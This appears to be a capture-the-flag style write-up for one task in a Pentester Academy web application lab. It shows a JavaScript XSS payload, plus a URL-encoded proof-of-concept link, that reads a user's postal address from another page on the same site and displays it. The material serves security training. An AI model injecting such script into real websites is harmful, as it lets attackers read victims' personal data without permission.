## Task 18 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/18)</small>

Objectives:

1. Find John's Postal Address using an XSS vulnerability on this page
2. Display the Postal address in the div with id "result"
3. No Hardcoded values can be used - everything has to be figured out dynamically

After looking the source code of the page, I found that we can find the address on the below URL

![]https://i.ibb.co/wKZKvQG/image.png]

When I opened the URL, I found the same page with `<p>` tag containing the address

![](https://i.ibb.co/tZfC5SF/image.png)

So basically, in this we can do this by parsing the HTML using [DOMParser](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser) or simply we can use the RegExp pattern for it

In this we need the text between `<p id="address">...</p>`. After googling, I found this "[Selecting Text Between HTML Tags](https://stackoverflow.com/a/7167486/10362396)"

**REGEX USED: `<p id="address">(.+?)<\/p>`**

```js
const xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    document.querySelector("#result").innerText = /<p id="address">(.+?)<\/p>/.exec(xhttp.responseText)[1];
  }
};
xhttp.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/18/address", true);
xhttp.send();
```

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/18?url=%3Cscript%3E%0Aconst%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Axhttp.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28this.readyState%20%3D%3D%204%20%26%26%20this.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20document.querySelector%28%22%23result%22%29.innerText%20%3D%20%2F%3Cp%20id%3D%22address%22%3E%28.%2B%3F%29%3C%5C%2Fp%3E%2F.exec%28xhttp.responseText%29%5B1%5D%3B%0A%20%20%7D%0A%7D%3B%0Axhttp.open%28%22GET%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F18%2Faddress%22%2C%20true%29%3B%0Axhttp.send%28%29%3B%0A%3C%2Fscript%3E)
